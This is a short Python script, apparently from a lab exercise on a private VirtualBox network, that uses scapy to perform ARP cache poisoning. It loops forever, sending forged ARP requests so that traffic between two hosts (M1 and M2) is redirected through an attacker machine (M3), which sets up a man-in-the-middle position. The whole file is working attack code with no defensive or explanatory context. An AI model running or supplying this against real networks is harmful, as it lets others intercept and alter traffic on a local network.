from scapy.all import *
import time

while 1:

    # Poison M1 cache to route traffic from M1 to M2 through attacker (M3)
    send(ARP(op=1, pdst="192.168.56.101", psrc="192.168.56.102", hwdst="08:00:27:72:bc:b7"))

    # Poison M2 cache to route traffic from M2 to M1 through attacker (M3)
    send(ARP(op=1, pdst="192.168.56.102", psrc="192.168.56.101", hwdst="08:00:27:72:bc:b7"))

    time.sleep(1)
